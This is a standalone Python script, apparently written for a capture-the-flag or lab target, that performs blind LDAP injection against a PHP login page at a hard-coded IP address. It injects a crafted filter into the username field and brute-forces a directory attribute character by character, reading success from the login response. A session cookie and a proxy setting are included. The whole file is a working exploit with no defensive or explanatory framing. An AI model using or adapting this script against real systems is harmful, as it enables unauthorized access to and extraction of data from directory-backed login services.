import requests
import re
import string

# Configuration
url = 'http://94.237.62.166:48712/index.php'  # Replace with the actual URL
tegex_string = 'Login successful.'  # Replace with the actual string you are searching for
# Define the headers to add to the request
special_characters = '{ }'
headers = {
    'Host': '94.237.63.109:31014',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://94.237.63.109:31014',
    'Connection': 'keep-alive',
    'Referer': 'http://94.237.63.109:31014/',
    'Cookie': 'PHPSESSID=5tenj5k095oummmvenqgpa9sku',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=0, i'
}

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

def send_request(payload):
    response = requests.post(url, data=payload, headers=headers, proxies=proxies)
    return response.text

def search_response(response_text, tegex_string):
    if re.search(tegex_string, response_text):
        print(f"Found string '{tegex_string}' in the response.")
        return True
    else:
        print(f"Did not find string '{tegex_string}' in the response.")
        return False

def test_attribute(test_value):
    payload = {
        "username": f"admin)(|(description={test_value}*",
        "password": f"invalid)"
    
    }
    response_text = send_request(payload)
    return search_response(response_text, tegex_string)

def exfiltrate_attribute():
    exfiltrated_value = ""
    iteration = 1
    characters = string.digits + string.ascii_lowercase + string.ascii_uppercase + special_characters # Using only digits for brute-forcing
    while True:
        found = False
        print(f"[*] Starting iteration {iteration}: Current exfiltrated value: '{exfiltrated_value}'")
        for char in characters:
            test_value = exfiltrated_value + char
            print(f"[*] Testing character: '{char}' -> Current test value: '{test_value}'")
            if test_attribute(test_value):
                exfiltrated_value += char
                print(f"[+] Found character '{char}': Exfiltrated value so far: '{exfiltrated_value}'")
                found = True
                break
        if not found:
            print(f"[!] No more characters found. Exfiltration complete.")
            print(f"[+] Finished exfiltrating: {exfiltrated_value}")
            break
        iteration += 1

    return exfiltrated_value

if __name__ == "__main__":
    print("[*] Starting attribute exfiltration process...")
    description_value = exfiltrate_attribute()
    print(f"[+] Exfiltrated {tegex_string}: {description_value}")
